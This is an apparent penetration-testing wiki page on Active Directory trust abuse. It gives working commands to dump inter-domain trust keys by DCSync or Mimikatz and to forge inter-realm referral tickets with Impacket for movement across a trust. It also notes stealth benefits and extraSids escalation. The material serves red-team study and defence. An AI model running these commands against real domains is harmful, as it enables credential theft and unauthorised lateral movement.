---
title: "Trust keys and inter-realm tickets"
order: 4
description: "Extracting the inter-domain trust key from the trusted-domain object and using it to forge inter-realm referral tickets that traverse an Active Directory trust, then requesting service tickets in the target domain."
keywords:
  - trust key
  - inter-realm TGT
  - trust account
  - referral ticket
  - trustedDomain
---

# Trust keys and inter-realm tickets

Every trust is backed by a shared secret: a **trust key**, stored as the password of an inter-domain **trust account** (`<DOMAIN>$`) and used to encrypt the **referral tickets** that let a principal in one domain request service tickets in another. Holding that key lets you forge those referral tickets directly, moving across the trust without the forged privilege living inside a golden ticket. It is the lower-level mechanism underneath both intra-forest and cross-forest movement.

**Lineage.** SID history began as a legitimate migration feature, letting a migrated account keep its old access. SID filtering and quarantine were added as the boundary against abuse, and forging inter-realm tickets with the trust key, together with extraSids injection, are the modern ways across a trust where that filtering is loose.

## Extracting the trust key

The trust key is the trust account's key, recoverable by [DCSync](../authentication/credentials/ntds-and-dcsync.md) once a domain is compromised:

```bash
# Dump trust keys (the [in]/[out] trust account hashes) along with the domain
secretsdump.py -just-dc 'EXAMPLE/admin:password@dc.example.local'
# Look for the "<trusted-domain>$" trust account entries and their trust keys
lsadump::trust /patch        # Mimikatz: dump trust keys on the DC
```

## Forging an inter-realm ticket

With the trust key, forge an inter-realm referral TGT for the trust, then present it to the target domain's KDC to obtain service tickets there:

```bash
# Forge the inter-realm TGT using the trust key, then request a service ticket
ticketer.py -nthash <trust-key> -domain-sid <SOURCE-domain-SID> \
  -domain source.example.local -spn krbtgt/target.example.local Administrator
export KRB5CCNAME=Administrator.ccache
getST.py -k -no-pass -spn cifs/target-host.target.example.local target.example.local/Administrator
```

Inside a forest, the referral ticket can also carry an `extraSids` claim (the SID-history path); across a forest trust, SID filtering strips it, so the ticket grants only what the named principal legitimately has in the target.

## Exploitation notes

- The trust key is per-trust and changes on the trust's password rotation (roughly every 30 days), so a dumped key is time-bounded, unlike a golden ticket keyed on `krbtgt`.
- Forging the inter-realm TGT is quieter than a full golden ticket for crossing a trust, because it uses the real referral mechanism rather than minting a domain TGT.
- What the resulting access is worth depends on the trust type: unfiltered (intra-forest, or a forest trust with filtering off) lets `extraSids` escalate; a filtered forest trust limits you to the principal's granted access (see [cross-forest trusts](cross-forest-trusts.md)).

## Tools

- **Impacket** (`secretsdump.py`, `ticketer.py`, `getST.py`): dump trust keys and forge inter-realm tickets.
- **Mimikatz** (`lsadump::trust`, `kerberos::golden /service:krbtgt /target:`): trust-key dump and inter-realm ticket forging.

## References

- The Hacker Recipes: trust tickets and inter-realm TGTs
- Microsoft: domain trusts and referral tickets
